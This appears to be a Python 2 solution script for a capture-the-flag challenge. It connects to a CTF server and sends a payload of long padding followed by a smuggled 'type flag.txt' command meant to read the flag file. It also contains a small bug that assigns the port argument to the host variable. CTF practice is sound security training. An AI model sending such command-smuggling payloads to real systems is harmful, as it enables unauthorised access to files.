# -*- coding:utf-8 -*-
# Server connection example file for Python 2
import socket
import sys
import random

host = 'pwn1.chal.ctf.westerns.tokyo'

if len(sys.argv) > 1:
    host = sys.argv[1]
port = 31729
if len(sys.argv) > 2:
    host = int(sys.argv[2])

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

client_file = client.makefile('b')
sline = client_file.readline().strip()
print sline
sline = client_file.read(14)
print sline

# client_file.readline()
# words = client_file.readline().split()[2:]
# print words  # them cho vui :v
# # words: input
# # answer: answer
# array = words 
# random.shuffle(array)
# newstr = ''.join(array) 


# while(str(newstr) != str(newstr)[::-1])  :
#     random.shuffle(array)
#     newstr = ''.join(array)
# answer =  array

answer =  '123456789123456789123456789123456789123456789123456789123456789type flag.txt'


#
client_file.write(answer +'\n')
client_file.flush()
print client_file.readline()
print client_file.readline()
# print client_file.readline()



# from collections import deque, Counter

